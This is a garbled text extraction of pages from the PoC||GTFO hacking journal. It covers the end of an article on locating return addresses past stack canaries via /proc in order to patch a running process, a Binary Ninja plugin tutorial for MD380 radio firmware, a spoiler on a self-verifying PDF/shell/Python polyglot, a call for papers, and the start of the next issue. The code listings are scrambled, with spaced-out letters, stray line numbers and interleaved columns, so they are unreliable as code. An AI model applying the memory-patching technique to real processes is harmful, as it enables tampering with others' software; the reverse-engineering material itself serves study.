frame with a canary on it. (This is x86, and of
course the stack grows toward lower addresses.)
Top of Stack
High entropy canaries simplify locating return
addresses. Once a maximum entropy word has been
located, an additional check can be made to see if
the value 16 bytes from that word looks like an ad-
dress. If that value is an address, it will fall within
the bounds of any of the pages listed for that pro-
cess in the /proc file system. While it is possible
that it might be a value that looks like an address,
it could also be a return address. At this point, you
can patch that value with your bad wares.
The POC of this technique and the accompa-
nying entropy calculation are included. 33 To calcu-
late entropy I applied the Shannon Entropy formula,
with the variant that I looked at bytes and not in-
dividual bits.
33 unzip
pocorgtfo16.pdf canarypoc.c
5116:11
Rescuing Orphans and their Parents with Rules of Thumb2
by Travis Goodspeed KK4VCZ,
concerning Binary Ninja and the Tytera MD380.
Howdy y’all,
It’s a common problem when reverse engineering
firmware that an auto-analyzer will recognize only a
small fraction of functions, leaving the majority un-
recognized because they are only reached through
function pointers. In this brief article, I’ll show you
how to extend Binary Ninja to recognize nearly all
functions in a threaded MicroC-OS/II firmware im-
age for ARM Cortex M4. This isn’t a polished plu-
gin or anything as fancy as the internal functions
of Binary Ninja; rather, it’s a story of how to kick
a high brow tool with some low level hints to effi-
ciently carve up a target image.
We’ll begin with the necessary chore of loading
our image to the right base address and kicking off
the auto-analyzer against the interrupt vector han-
dlers. That will give us main() and its direct chil-
dren, but the auto-analyzer will predictably choke
when it hits the function that kicks off the threads,
which are passed as function pointers.
Next, we’ll take some quick theories about the
compiler’s behavior, test them for correctness, and
then use these rules of thumb to reverse engineer real
binaries. These rules won’t be true for every possi-
ble binary, but they happen to be true for Clang and
GCC, the only compilers that matter.
Detecting Orphaned Function Calls
Unfortunately, this loader script will only identify
227 functions out of more than a thousand. 35
1 >>> l e n ( bv . f u n c t i o n s )
227
The majority of functions are lost because they
are only called from within threads, and the threads
are initialized through function pointers that the
autoanalyzer is unable to recognize. Given a sin-
gle image to reverse engineer, we might take the
time to hunt down the init_threads() function
and manually defined each thread entry point as
a function, but that quickly becomes tedious. In-
stead, let’s script the auto-analyzer to identify par-
ents from known child functions, rather than just
children from known parent functions.
Thumb2 uses a bl instruction, branch and link,
to call one function from another. This instruction
is 32 bits long instead of the usual 16, and in the
Thumb1 instruction set was actually two distinct
16-bit instructions. To redirect function calls, the
re-linking script of MD380Tools searches for every
32-bit word which, when interpreted as a bl, calls
the function to be hooked; it then overwrites those
words with bl instructions that call the new func-
tion’s address.
Loading Firmware
Binary Ninja has excellent loaders for PE and ELF
files, but raw firmware images require either conver-
sion or a custom loader script. You can find a full
loader script in the md380tools repository, 34 but an
abbreviated version is shown in Figure 5.
The loader will open the firmware image, as well
as blank regions for SRAM and TCRAM. For full
reverse engineering, you will likely want to also load
an extracted core dump of a live device into SRAM.
34 git
35 Hit
clone https://github.com/travisgoodspeed/md380tools
the backquote button to show the python console, just a like one o’ them vidya games.
522
4
c l a s s MD380View ( B i n a r y V i e w ) :
""" T h i s c l a s s i m p l e m e n t s a v i e w o f
t h a t m i g h t b e a f i r m w a r e image f o r
t o 0 x0800C000 .
"""
t h e l o a d e d firmware ,
t h e MD380 o r r e l a t e d
f o r any image
radios loaded
6
8
d e f __init__ ( s e l f , d a t a ) :
B i n a r y V i e w . __init__ ( s e l f ,
s e l f . raw = d a t a
file_metadata = data . f i l e ,
parent_view = data )
10
22 @classmethod
def i s_ va l i d _f or _d a ta ( s e l f , data ) :
hdr = data . r e a d ( 0 , 0 x160 )
i f l e n ( h d r ) < 0 x 1 6 0 or l e n ( h d r ) >0x 1 0 0 0 0 0 :
return F a l s e
i f ord ( h d r [ 0 x3 ] ) != 0 x20 :
# F i r s t word i s t h e i n i t i a l s t a c k p o i n t e r ,
return F a l s e
i f ord ( h d r [ 0 x7 ] ) != 0 x08 :
# Second word i s t h e r e s e t v e c t o r , must b e
return F a l s e
return True
24 def init_common ( s e l f ) :
s e l f . p l a t f o r m = A r c h i t e c t u r e [ " thumb2 " ] . s t a n d a l o n e _ p l a t f o r m
s e l f . h d r = s e l f . raw . r e a d ( 0 , 0 x 1 0 0 0 0 1 )
def i n i t _ t h u m b 2 ( s e l f , a d r=0x 0 8 0 0 0 0 0 0 ) :
try :
s e l f . init_common ( )
s e l f . thumb2_offset = 0
s e l f . arm_entry_addr = s t r u c t . unpack ( "<L" , s e l f . h d r [ 0 x4 : 0 x8 ] ) [ 0 ]
s e l f . thumb2_load_addr = a d r #s t r u c t . unpack ("<L" , s e l f . h d r [ 0 x38 : 0 x3C ] ) [ 0 ]
s e l f . thumb2_size = len ( s e l f . hdr ) ;
12
14
16
18
20
26
28
30
32
34
36
must
in
be
Flash
i n SRAM around 0 x 2 0 0 0 0 0 0 0 .
around 0 x 0 8 0 0 0 0 0 0 .
c o d e f l a g s=S e g m e n t F l a g . S e g m e n t R e a d a b l e | S e g m e n t F l a g . S e g m e n t E x e c u t a b l e ;
r a m f l a g s=c o d e f l a g s | S e g m e n t F l a g . S e g m e n t W r i t a b l e ;
38
# Add s e g m e n t f o r SRAM, n o t b a c k e d b y f i l e c o n t e n t s
s e l f . add_auto_segment ( 0 x 2 0 0 0 0 0 0 0 , 0 x20000 , #128K a t a d d r e s s 0 x 2 0 0 0 0 0 0 0 .
0 , 0 , ramflags )
# Add s e g m e n t f o r TCRAM, n o t b a c k e d b y f i l e c o n t e n t s
s e l f . add_auto_segment ( 0 x 1 0 0 0 0 0 0 0 , 0 x10000 , #64K a t a d d r e s s 0 x 1 0 0 0 0 0 0 0 .
0 , 0 , ramflags )
#Add a s e g m e n t f o r t h i s F l a s h a p p l i c a t i o n .
s e l f . add_auto_segment ( s e l f . thumb2_load_addr , s e l f . thumb2_size ,
s e l f . t h u m b 2 _ o f f s e t , s e l f . thumb2_size ,
codeflags )
40
42
44
46
48
50
#D e f i n e t h e RESET v e c t o r e n t r y p o i n t .
s e l f . d e f i n e _ a u t o _ s y m b o l ( Symbol ( SymbolType . F u n c t i o n S y m b o l ,
s e l f . arm_entry_addr &~1 , "RESET" ) )
s e l f . a d d _ e n t r y _ p o i n t ( s e l f . arm_entry_addr &~1)
52
54
56
58
60
62
64
66
def
68
70
def
#D e f i n e o t h e r e n t r i e s o f t h e I n t e r r u p t V e c t o r T a b l e ( IVT )
f o r i v t i n d e x i n range ( 8 , 0 x 1 8 4 + 4 , 4 ) :
i v e c t o r=s t r u c t . unpack ( "<L" , s e l f . h d r [ i v t i n d e x : i v t i n d e x + 4 ] ) [ 0 ]
i f i v e c t o r >0:
#C r e a t e t h e s y m b o l , t h e n t h e e n t r y p o i n t .
s e l f . d e f i n e _ a u t o _ s y m b o l ( Symbol ( SymbolType . F u n c t i o n S y m b o l ,
i v e c t o r &~1 , " vec_%x "%i v e c t o r ) )
s e l f . a d d _ f u n c t i o n ( i v e c t o r &~1) ;
return True
except :
l o g _ e r r o r ( t r a c e b a c k . format_exc ( ) )
return F a l s e
perform_is_executable ( s e l f ) :
return True
perform_get_entry_point ( s e l f ) :
return s e l f . arm_entry_addr
72
74
76
78
c l a s s MD380AppView ( MD380View ) :
"""MD380 A p p l i c a t i o n l o a d e d t o 0 x0800C000 . """
name = "MD380"
long_name = "MD380 F l a s h A p p l i c a t i o n "
def
init ( self ) :
return s e l f . i n i t _ t h u m b 2 ( 0 x 0 8 0 0 c 0 0 0 )
80
MD380AppView . r e g i s t e r ( )
Figure 5. MD380 Firmware Loader for Binary Ninja
53To detect orphaned function calls, which exist in
the binary but have not been declared as code func-
tions, we can search backward from known function
entry points, just as the re-linker in MD380Tools
searches backward to redirection function calls!
Let’s begin with the code that calculates a bl in-
struction from a source address to a target. Notice
how each 16-bit word of the result has an F for its
most significant nybble. MD380Tools uses this same
trick to ignore function calls when comparing func-
tions to migrate symbols between target firmware
revisions.
To catch data references to executable code, we
also look for data words with the function’s entry
address, which will catch things like interrupt vec-
tors and thread handlers, whose addresses are in a
constant pool, passed as a parameter to the function
that kicks of a new thread in the scheduler.
See Figure 6 for a quick and dirty plugin that
identifies orphaned function calls to currently se-
lected function. It will print the addresses of all or-
phaned called (those not in a known function) and
also data references, which are terribly handy for
recognizing the sources of callback functions. 36
def c a l c b l ( adr , t a r g e t ) :
""" C a l c u l a t e s t h e Thumb code t o branch
t o a t a r g e t . """
4
o f f s e t = t a r g e t − adr
o f f s e t −= 4 # PC p o i n t s t o n e x t i n s .
6
o f f s e t = ( o f f s e t >> 1 ) # LSBit i g n o r e d
2
8
10
Detecting Starts of Functions
Now that we can identify orphaned function calls,
that is, bl instructions calling known functions from
outside of any known function, it would be nice
to identify where the function call’s parent begins.
That way, we could auto-analyze the firmware im-
age to identify all parents of known functions, letting
Binary Ninja’s own autoanalyzer identify the other
children of those parents on its own.
With a little luck, we can could crawl from a few
I/O functions all the way up to the UI code, then
all the way back down to leaf functions, and back to
all the code that calls them. This is especially im-
portant for firmware with an RTOS, as the thread
scheduling functions confuse an auto-analyzer that
only recognizes child functions.
First, we need to know what functions begin
with. To do that, we’ll just write a quick plugin
that prints the beginning of each function. I ran
this on a project with known symbols, to get a feel
for how the compiler produces functions.
# Hi a d d r e s s s e t t e r , b u t a t l o w e r adr .
h i = 0 xF000 | ( ( o f f s e t &0 x 3 f f 8 0 0 ) >>11)
# Low adr s e t t e r g o e s n e x t .
l o = 0 xF800 | ( o f f s e t & 0 x 7 f f )
12
14
word = ( ( l o << 1 6 ) | h i )
return word
This handy little function let us compare every
32-bit word in memory to the 32-bit word that would
be a bl from that address to our target function.
This works fine in Python because a typical Thumb2
firmware image is no more than a megabyte; we
don’t need to write a native plugin.
So for each word, we calculate a branch from
that address to our function entry point, and then
by comparison we have found all of the bl calls to
that function.
Knowing the source of a bl branch, we can then
check to see if it is in a function by asking Binary
Ninja for its basic block. If the basic block is None,
then the bl instruction is outside of a function, and
we’ve found an orphaned call.
p r e v f u n c a d r=
v . get_previous_function_start_before (
s t a r t+i )
4 p r e v f u n c=
v . get_function_at ( prevfuncadr )
6 b a s i c b l o c k=
p r e v f u n c . get_basic_block_at ( s t a r t+i )
2
1 #E x p o r t s f u n c t i o n p r e f i x e s t o a f i l e .
def e x p o r t f u n c t i o n p r e a m b l e s ( view ) :
3
f o r f u n in view . f u n c t i o n s :
print "%08x : %s %s " % ( f u n . s t a r t ,
5
hexdump ( view . r e a d ( f u n . s t a r t , 4 ) ) ,
view . g e t _ d i s a s s e m b l y ( f u n . s t a r t ,
7
A r c h i t e c t u r e [ "thumb2" ] ) )
9 PluginCommand . r e g i s t e r (
" Export F u n c t i o n Preambles " ,
11
" P r i n t s f o u r b y t e s f o r each f u n c t i o n . " ,
exportfunctionpreambles ) ;
36 As I write this, Binary Ninja seems to only recognize data references which are themselves used in a known function or that
function’s constant pool. It’s handy to manually search beyond that range, especially when a core dump of RAM is available.
541 def t h u m b 2 f i n d o r p h a n e d c a l l s ( view , f u n ) :
i f f u n . a r c h . name!= "thumb2" :
3
print " Sorry , t h i s o n l y works f o r thumb2 , not f o r %s . " % f u n . a r c h . name ;
return ;
5
print " S e a r c h i n g f o r c a l l s t o %s a t 0x%x . " % ( f u n . name , f u n . s t a r t ) ;
7
9
11
13
15
17
19
21
23
25
27
29
31
33
35
37
39
41
43
#Fix t h e s e t o match t h e image .
s t a r t=view . s t a r t ;
count=None ;
#I f we ’ r e l u c k y , t h e branch i s i n a segment , which we can u s e as a
#ran ge .
f o r s e g in view . s e gm e nt s :
i f s e g . s t a r t <f u n . s t a r t and s e g . end>f u n . s t a r t :
count=s e g . end−s t a r t ;
i f count==None :
print "Abandoned s e a r c h f o r orphaned c a l l s t o %s a s out o f r a n g e . " % f u n . name ;
print " S e a r c h i n g from 0x%08x t o 0x%08x . " % ( s t a r t , s t a r t+count )
data=view . r e a d ( s t a r t , count ) ;
count=len ( data ) ;
f o r i in xrange ( 0 , count −2 ,2) :
word=(ord ( data [ i ] )
| ( ord ( data [ i +1])<<8)
| ( ord ( data [ i +2]) <<16)
| ( ord ( data [ i +3]) <<24) ) ;
i f word==c a l c b l ( s t a r t+i , f u n . s t a r t ) :
p r e v f u n c a d r=view . g e t _ p r e v i o u s _ f u n c t i o n _ s t a r t _ b e f o r e ( s t a r t+i ) ;
p r e v f u n c=view . g e t _ f u n c t i o n _ a t ( p r e v f u n c a d r )
b a s i c b l o c k=p r e v f u n c . get_basic_block_at ( s t a r t+i ) ;
i f b a s i c b l o c k !=None :
#We ’ r e i n a f u n c t i o n .
print "%08x : %s " % ( s t a r t+i , p r e v f u n c . name ) ;
i f p r e v f u n c . s t a r t != b e g i n n i n g o f t h u m b 2 f u n c t i o n ( view , s t a r t+i ) :
print "ERROR: Does t h e f u n c t i o n s t a r t a t %x o r %x ? " % (
prevfunc . start ,
b e g i n n i n g o f t h u m b 2 f u n c t i o n ( view , s t a r t+i ) ) ;
else :
#We ’ r e n o t i n a f u n c t i o n .
print "%08x : ORPHANED! " % ( s t a r t+i ) ;
e l i f word==(( f u n . s t a r t ) | 1 ) :
print "%08x : DATA! " % ( s t a r t+i ) ;
45
PluginCommand . r e g i s t e r _ f o r _ f u n c t i o n (
" Find Orphaned C a l l s " ,
" F i n d s orphaned thumb2 c a l l s t o t h i s f u n c t i o n . " ,
49
thumb2findorphanedcalls ) ;
47
Figure 6. This finds all calls from unregistered functions to the selected function.
55Running this script shows us that functions be-
gin with a number of byte pairs. As these convert
to opcodes, let’s play with the most common ones
in assembly language!
fff7 febf is an unconditional branch-to-self, or
an infinite while loop. You’ll find this at all of the
unused interrupt vector handlers, and as it has no
children, we can ignore it for the purposes of work-
ing backward to a function definition, as it never
calls another function. 7047 is bx lr, which sim-
ply returns to the calling function. Again, it has no
child functions, so we can ignore it.
80b5 is push {r7, lr}, which stores the link
register so that it can call a child function. Simi-
larly, 10b5 pushes r4 and lr so that it can call a
child function. f8b5 pushes r3, r4, r5, r6, r7, and
lr. In fact, any function that calls children will
begin by pushing the link register, and functions
generated by a C compiler seem to never push lr
anywhere except at the beginning.
So we can write a quick little function that walks
backward from any bl instruction that we find out-
side of known functions until it finds the entry point.
We can also test this routine whenever we have a
known function entry point, as a sanity check that
we aren’t screwing up the calculations somehow.
problem, because the false positive in these cases is
still the starting address of some function, confus-
ing our plugin but not ruining our database with
unreliable entries.
–——–
———
—–—–
So now that we can both identify orphaned calls
from parent functions to a child and the backward
reference from a child to its parent, let’s write a rou-
tine that registers all parents within Binary Ninja.
1 #We ’ r e n o t i n a f u n c t i o n .
print "%08x : ORPHANED! " % ( s t a r t+i ) ;
3 #R e g i s t e r t h a t f u n c t i o n
adr=b e g i n n i n g o f t h u m b 2 f u n c t i o n ( view , s t a r t+i ) ;
5 view . define_auto_symbol (
Symbol ( SymbolType . FunctionSymbol ,
7
adr , "fun_%x"%adr ) )
view . a d d _ f u n c t i o n ( adr ) ;
And if we can do this for one function, why not
automate doing it for all known functions, to try
and crawl the database for every unregistered func-
tion in a few passes? A plugin to register parents of
one function is shown in Figure 6, and it can easily
be looped for all functions.
Unfortunately, after running this naive imple-
mentation for seven minutes, only one hundred new
functions are identifies; a second run takes twenty
minutes, resulting in just a couple hundred more.
That is way too damned slow, so we’ll need to clean
it up a bit. The next sections cover those improve-
ments.
#I d e n t i f i e s t h e e n t r y p o i n t o f a f u n c t i o n ,
2 #g i v e n an a d d r e s s .
def b e g i n n i n g o f t h u m b 2 f u n c t i o n ( view , adr ) :
4
""" I d e n t i f i e s t h e s t a r t o f t h e thumb2
f u n c t i o n t h a t i n c l u d e adr . """
6
print " S e a r c h i n g from %x . " % adr
8
10
12
14
16
a=adr ;
while a>view . s t a r t :
d i s=view . g e t _ d i s a s s e m b l y ( a ,
A r c h i t e c t u r e [ "thumb2" ] )
i f " push " in d i s :
i f " l r " in d i s :
print "Found e n t r y a t 0x%08x"%a ;
return a ;
a−=2;
Better in Big-O
We are scanning all bytes for each known function,
when we ought to be scanning for all potential calls
and then white-listing the ones that are known to
be within functions. To fix that, we need to gen-
erate quick functions that will identify potential bl
instructions and then check to see if their targets
are in the known function database. (Again, we ig-
nore unknown targets because they might be false
positives.)
Recognizing a bl instruction is as easy as check-
ing that each half of the 32-bit word begins with an
F.
18 PluginCommand . r e g i s t e r _ f o r _ a d d r e s s (
" Find B e g i n n i n g o f F u n c t i o n " ,
20
" Find t h e b e g i n n i n g o f a thumb2 f n . " ,
beginningofthumb2function ) ;
This seems to work well enough for a few exam-
ples, but we ought to check that it works for every bl
address. After thorough testing it seems that this is
almost always accurate, with rare exceptions, such
as noreturn functions, that we’ll discuss later in this
paper. Happily, these exceptions aren’t much of a
def i s b l ( word ) :
""" Returns t r u e i f t h e word might be
a BL i n s t r u c t i o n . """
4
return ( word&0xF000F000 )==0xF000F000 ;
2
56We can then decode the absolute target of that
relative branch by inverting the calcbl() function
from page 54.
2
tions, those that don’t push the link register at their
beginning because they never use it to return.
For every call from a function that doesn’t re-
turn, all 568 calls in my image, our tool is now
wasting some time to fail in finding the entry point
of every outbound function call.
But rather than the quick fix, which would be
to speed up these false calls by pre-computing their
failure through a ranged lookup table, we can use
them as an oracle to identify the patriarch functions
which never return and have no direct parents. They
should each appear in localized clumps, and each of
these clumps ought to be a single patriarch function.
Rather than the 568 outbound calls, we’ll then only
be dealing with a few not-quite-identified functions,
eleven to be precise.
These eleven functions can then be manually in-
vestigated, or ignored if there’s no cause to hook
them.
def d e c o d e b l ( adr , word ) :
""" Decodes a Thumb BL i n s t r u c t i o n i t s
v a l u e and a d d r e s s . """
4
6
8
10
12
#Hi and Lo r e f e r t o adr components .
#The Hi word comes f i r s t .
h i=word&0xFFFF ;
l o =(word&0xFFFF0000 )>>16
#Decode t h e word .
r h i =( h i &0x0FFF )<<11
r l o =( l o &0x7FF )
r e c o v e r e d=r h i | r l o ;
14
16
#Sign−e x t e n d backward r e f e r e n c e s .
i f ( r e c o v e r e d &0x00200000 ) :
r e c o v e r e d |=0 xFFC00000 ;
18
20
#Apply t h e o f f s e t and s t r i p o v e r f l o w
o f f s e t =4+( r e c o v e r e d <<1) ;
return ( o f f s e t+adr )&0xFFFFFFFF ;
>>> len ( bv . f u n c t i o n s )
2 1924
With this, we can now efficiently identify the tar-
gets of all potential calls, adding them to the func-
tion database if they both (1) are the target of a
bl and (2) begin by pushing the link register to the
stack. This finds sixteen hundred functions in my
target, in the blink of an eye and before looking at
any parents.
Then, on a second pass, we can register three
hundred parents that are not yet known after the
first pass. This stage is effective, finding nearly all
unknown functions that return, but it takes a lot
longer.
–——–
———
—–—–
This paper has stuck to the Thumb2 instruction
set, without making use of Binary Ninja’s excellent
intermediate representations or other advanced fea-
tures. This makes it far easier to write the plugin,
but limits portability to other architectures, which
will violate the convenient rules that we’ve found for
this one. In an ideal world we’d do everything in the
intermediate language, and in a cruel world we’d do
all of our analysis in the local machine language, but
perhaps there’s a proper middle ground, one where
short-lived scripts provide hints to a well-engineered
back-end, so that we can all quickly tear apart tar-
get binaries and learn what these infernal machines
are really thinking?
You should also be sure to look at the IDA
Python Embedded Toolkit by Maddie Stone, whose
Recon 2017 talk helped inspire these examples. 37
1 >>> len ( bv . f u n c t i o n s )
1913
Patriarchs are Slow as Dirt
So why can the plugin now identify children so
quickly, while still slowing to molasses when identi-
fying parents? The reason is not the parents them-
selves, but the false negatives for the patriarch func-
37 git
73 from Barcelona,
–Travis
clone https://github.com/maddiestone/IDAPythonEmbeddedToolkit
5716:12
This PDF is a Shell Script
That Runs a Python Webserver
That Serves a Scala-Based JavaScript Compiler
With an HTML5 Hex Viewer; or,
Reverse Engineer Your Own Damn Polyglot
by Evan Sultanik
This PDF starts a web server that displays an annotated hex view of itself, ripe with the potential for
reverse enginerding.
$ sh pocorgtfo16.pdf 8080
Listening on port 8080...
http://localhost:8080/
PoCkGTFO Issue 0x16
In Which a PDF is a Shell Script that Runs a Python Webserver
Serving a Scala-Based JavaScript Compiler with an HTML5 Hex
Viewer that Can Help You Reverse Engineer Itself
Neighbor, as you read this, your web browser is downloading the dozens of megabytes
constituting pocorgtfo16.pdf. From itself. Depending on your endowment of RAM,
you may notice your operating system start to resist. Please be patient, as this may
take a couple minutes to load.
The hex viewer used for this polyglot is Kaitai Struct’s WebIDE, which is freely available
under the GPL v3. The only modifications we made to it were to display this dialog
and to auto-load pocorgtfo16.pdf. All of the modified source code is available in the
feelies.
Despite where you may stand in The Great Editor Schism, Pastor Manul Laphroaig
urges you to put aside your theological differences and celebrate this great licensing
achievement of Saint IGNUcius—which is not so much different than our own самиздат
license—, without which this polyglot would have likely been impossible. Sanctity can
be found in all manner of hackery. In any event, we hear that the good Saint runs Vim
from inside of Emacs, which is not so much different than our own polyglots.
This is a fully functional hex viewer and reverse engineering tool, with which you can load
any other file from your filesystem. We have annotated the PDF using Kaitai Struct,
which should be sufficient for you to figure it all out. You might even be tempted to
edit the PDF to make your own PoC, but be careful! We’ve included some tricks to
make modifications more of a challenge for you. But most importantly: Have fun!
Close
58Warning: Spoilers ahead! Stop reading now if you want the challenge of
reverse engineering this polyglot on your own!
The General Method Obfuscations
First, let’s talk about the overall method by which
this polyglot was accomplished, since it’s slightly
different than that which we used for the Ruby web-
server polyglot in PoCkGTFO 11:9. After that I’ll
give some further spoilers on the additional obfus-
cations used to make reversing this polyglot a bit
more challenging.
The file starts with the following shell wizardry: In actuality, we added a second PDF object stream
before the one discussed above. This contains some
padding bytes followed by 16 KiB of MD5 colli-
sions that are used to encode the MD5 hash of the
PDF (cf. 14:12). The padding bytes are to ensure
that the collision occurs at a byte offset that is a
multiple of 64.
Next, the “Python webserver code” is actually
base64 encoded. That means the only Python code
you’ll see if you open the PDF in a hex viewer is
exec sys.stdin.read().decode("base64").
The first thing that the webserver does is read
itself, find the first PDF stream object containing
its MD5 quine, decode the MD5 hash, and com-
pare that to its actual MD5 hash. If they don’t
match, then the web server fails to run. In other
words, if you try and modify the PDF at all, the
webserver will fail to run unless you also update the
MD5 quine. (Or if you remove the MD5 check in
the webserver script.)
From where does the script serve its files?
HTML, CSS, JavaScript, . . . they need to be some-
where. But where are they?
The observant reader might notice that there is
a particular file, “PoC.pdf”, 38 that was purposefully
omitted from the feelies index. It sure is curious
that that PDF—whose vector drawing should be no
more than a few hundred KiB—is in fact 6.5 MiB!
Sure enough, that PDF is an encrypted ZIP poly-
glot!
The ZIP password is hard-coded in the Python
script; the first three characters are encoded
using the symbolic regression trick from 16:09
(q.v. page 47), and the remaining characters in the
password are encoded using Python reflection obfus-
cation that simply amounts to a ROT13 cipher. In
summary, the web server extracts itself in-memory,
and then decrypts and extracts the encrypted ZIP.
!
read -d ’’ String <<"PYTHONSTART"
This uses here document syntax to slurp up all of the
bytes after this line until it encounters the string
“PYTHONSTART” again. This is piped into read as
stdin, and promptly ignored. This gives us a place
to insert the PDF header in such a way that it does
not interfere with the shell script.
Inside of the here document goes the PDF header
and the start of a PDF stream object that will con-
tain the Python webserver script. This is our stan-
dard technique for embedding arbitrary bytes into a
PDF and has been detailed numerous times in pre-
vious issues. Python is bootstrapped by storing its
code in yet another here document, which is passed
to python’s stdin and run via Python’s exec com-
mand.
! read -d ’’ String <<"PYTHONSTART"
%PDF-1.5
%0x25D0D4C5D8
9999 0 obj
<</Length # bytes in the stream
>>
stream
PYTHONSTART
python -c ’import sys;
exec sys.stdin.read()’ $0 $* <<"ENDPYTHON"
Python webserver code
ENDPYTHON
exit $?
endstream
endobj
Remainder of the PDF
38 Here,
“PoC” stands for “Pictures of Cats”, because the PDF contains a picture of Micah Elizabeth Scott’s cat Tuco.
5916:13
Laphroaig’s Home for Unwanted Polyglots and 0day
from the desk of Pastor Manul Laphroaig,
Tract Association of PoCkGTFO.
Dearest neighbor,
Our scruffy little gang started this самиздат
journal a few years back because we didn’t much
like the academic ones, but also because we wanted
to learn new tricks for reverse engineering. We
wanted to publish the clever tricks that make re-
verse engineering and polyglots possible, so that
folks could learn from others’ experience. Over the
years, we’ve been blessed with the privilege of edit-
ing these tricks, of seeing them early, and of seeing
them through to print.
Now it’s your turn to share a trick or two, that
nifty little truth that other folks might not yet know.
It could be simple, 39 or a bit advanced. 40 Whatever
your nifty tricks, if they a clever, we would like to
publish them.
Do this: write an email telling our editors how
to reproduce ONE clever, technical trick from your
research. If you are uncertain of your English, we’ll
happily translate from French, Russian, Southern
Appalachian, and German. If you don’t speak those
languages, we’ll draft a translator from those poor
sods who owe us favors.
Like an email, keep it short. Like an email, you
should assume that we already know more than a
bit about hacking, and that we’ll be insulted or—
WORSE!—that we’ll be bored if you include a long
tutorial where a quick reminder would do.
Use 7-bit ASCII if your language doesn’t re-
quire funny letters, as whenever we receive some-
thing typeset in OpenOffice, we briefly mistake it
for a ransom note.
Teach me how to falsify a freshman physics ex-
periment by abusing floating-point edge cases. Show
me how to enumerate the behavior of all illegal in-
structions in a particular 6502.
Don’t tell us that it’s possible; rather, teach us
how to do it ourselves with the absolute minimum
of formality and bullshit.
Like an email, we expect informal language and
hand-sketched diagrams. Write it in a single sit-
ting, and leave any editing for your poor preacher-
man to do over a bottle of fine scotch. Send this
to pastor@phrack org and hope that the neighborly
Phrack folks—praise be to them!—aren’t man-in-the-
middling our submission process.
Yours in PoC and Pwnage,
Pastor Manul Laphroaig, T G S B
39 To
40 To
reveal a bad RNG, make a scatter plot of pairs of values. If you see snowflakes, the RNG is easily broken.
compare Thumb instructions a and b while ignoring linker relocations, test for a = bka&b&0xF000 = 0xF000.
60PoC|| GTFO
P
r
o
o
f
o
f
C
o
n
c
e
p
t
o
r
G
e
t
T
h
e
F
u
c
k
O
u
t
It’s damned cold outside,
so let’s light ourselves a fire!
warm ourselves with whiskey!
and teach ourselves some tricks!
17:02 (p. 5) AES-CBC Shellcode
17:03 (p. 9) Tall Tales of Science and Fiction
17:04 (p. 13) Sniffing BTLE with the Micro:Bit
17:05 (p. 21) Bit-Banging Ethernet
17:06 (p. 32) The DIP Flip Whixr Trick
17:07 (p. 34) Injecting Shared Objects on FreeBSD
17:08 (p. 42) Murder on the USS Table
17:09 (p. 56) Infect to Protect
Des Teufels liebstes Möbelstück ist die lange Bank. Это самиздат.
Compiled on December 30, 2017. Free Radare2 license included with each and every copy!
0, $0 USD, $0 AUD, 0 RSD, 0 SEK, $50 CAD, 6 × 10 29 Pengő (3 × 10 8 Adópengő), 100 JPC.Legal Note: Please make an extra copy of this scientific journal, by laserjet or by typewriter самиздат,
and give it away. Give it to a friend, leave it in the magazine rack at the doctor’s office, or hide it inside a
good technical book at your local library.
Reprints: Bitrot will burn libraries with merciless indignity that even Pets Dot Com didn’t deserve. Please
mirror—don’t merely link!—pocorgtfo17.pdf and our other issues far and wide, so our articles can help fight
the coming flame deluge. We like the following mirrors.
https://unpack.debug.su/pocorgtfo/
https://pocorgtfo.hacke.rs/
https://www.alchemistowl.org/pocorgtfo/ https://www.sultanik.com/pocorgtfo/
Technical Note: This file, pocorgtfo17.pdf, is valid as a PDF file, a ZIP file, and as firmware for the
Apollo Guidance Computer We the editors do not recommend it for use in space navigation, and we warn
our fine readers that replacing a spaceship’s navigational firmware before a flight would be a joke in extremely
poor taste.
UPLINK
ACTY
NO ATT
TEMP
COMP
ACTY
GIMBAL
LOCK
VERB
STBY
RESTART
TRACKER
PRIO
DISP
ALT
NO DAP
PROG
88
NOUN
88 88
43556
88888
88888
96753
88888
34 23
PROG
KEY REL OPR ERR
VERB
VEL
+ 7 8 9 - 4 5 6 PRO
0 1 2 3 KEY
REL
CLR
ENTR
NOUN
RSET
# Start the emulator GUI on localhost:19697
(cd VirtualAGC/Resources && ../bin/yaDSKY2) &
# Assemble the firmware image.
yaYUL pocorgtfo17.pdf
# Engage!
yaAGC --nodebug pocorgtfo17.pdf.bin
Cover Art: As with the previous issue, the cover illustration from this release is a Hildibrand engraving
of a painting by Léon Benett that was first published in Le tour du monde en quatre-vingts jours by Jules
Verne in 1873.
Printing Instructions: Pirate print runs of this journal are most welcome! PoCkGTFO is to be printed
duplex, then folded and stapled in the center. Print on A3 paper in Europe and Tabloid (11” x 17”) paper
in Samland, then fold to get a booklet in A4 or Letter size. Secret volcano labs in Canada may use P3
(280 mm x 430 mm) if they like, folded to make P4. The outermost sheet should be on thicker paper to
form a cover.
# This is how to convert an issue for duplex printing.
sudo apt-get install pdfjam
pdfbook --short-edge --vanilla --paper a3paper pocorgtfo17.pdf -o pocorgtfo17-book.pdf
Man of The Book
Manul Laphroaig
Editor of Last Resort
Melilot
TEXnician
Evan Sultanik
Editorial Whipping Boy
Jacob Torrey
Funky File Supervisor
Ange Albertini
Assistant Scenic Designer Philippe Teuwen
Scooby Bus Driver
Ryan Speers
with the good assistance of
Samizdat Postmaster
Nick Farr
217:01
I thought I turned it on, but I didn’t.
Neighbors, please join me in reading this eigh-
teenth release of the International Journal of Proof
of Concept or Get the Fuck Out, a friendly little
collection of articles for ladies and gentlemen of dis-
tinguished ability and taste in the field of reverse
engineering and the study of weird machines. This
release is a gift to our fine neighbors in Leipzig and
Washington, D.C.
If you are missing the first seventeen issues, we
suggest asking a neighbor who picked up a copy of
the first in Vegas, the second in São Paulo, the third
in Hamburg, the fourth in Heidelberg, the fifth in
Montréal, the sixth in Las Vegas, the seventh from
his parents’ inkjet printer during the Thanksgiv-
ing holiday, the eighth in Heidelberg, the ninth in
Montréal, the tenth in Novi Sad or Stockholm, the
eleventh in Washington D.C., the twelfth in Heidel-
berg, the thirteenth in Montréal, the fourteenth in
São Paulo, San Diego, or Budapest, the fifteenth in
Canberra, Heidelberg, or Miami, the sixteenth re-
lease in Montréal, New York, or Las Vegas, or the
seventeenth release in São Paulo or Budapest.
After our paper release, and only when quality
control has been passed, we will make an electronic
release named pocorgtfo17.pdf. It is a valid PDF
document and a ZIP file filled with fancy papers
and source code. It is also a valid program for the
Apollo Guidance Computer, which will run in the
VirtualAGC emulator
As you’ll recall from PoCkGTFO 3:11, AES in
CBC mode allows you to flip bits of the initializa-
